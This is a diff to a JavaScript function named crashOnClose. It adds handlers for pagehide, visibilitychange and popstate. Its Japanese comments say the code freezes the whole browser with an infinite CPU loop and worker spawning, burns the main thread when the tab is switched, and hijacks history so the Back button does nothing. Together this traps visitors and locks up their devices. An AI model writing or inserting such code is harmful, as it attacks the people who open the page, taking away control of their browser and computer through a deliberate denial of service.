@@ -104,11 +104,47 @@ function crashOnClose() {
     }
   }
 
+  // beforeunload
   window.addEventListener('beforeunload', (e) => {
     explode(0);
     e.preventDefault();
     e.returnValue = '';
     setTimeout(() => explode(2), 0);
+  });
+
+  // pagehide（これでほぼ確実に引っかかる）
+  window.addEventListener('pagehide', () => {
+    explode(3);
+    // 無限ループでブラウザごと固める
+    while (true) {
+      for (let i = 0; i < 1e7; i++) {
+        Math.sqrt(Math.random());
+      }
+      spawnWorker();
+    }
+  });
+
+  // visibilitychange も監視（タブ切り替えでも発動）
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      explode(2);
+      // メインスレッドも焼く
+      setInterval(() => {
+        for (let i = 0; i < 1e6; i++) {
+          Math.sqrt(Math.random());
+        }
+      }, 0);
+    }
+  });
+
+  // 履歴を細工して「戻る」を無効化 + ついでに爆撃
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', () => {
+    history.pushState(null, '', location.href);
+    explode(3);
+    for (let i = 0; i < 1e8; i++) {
+      Math.sqrt(Math.random());
+    }
   });
 }
 
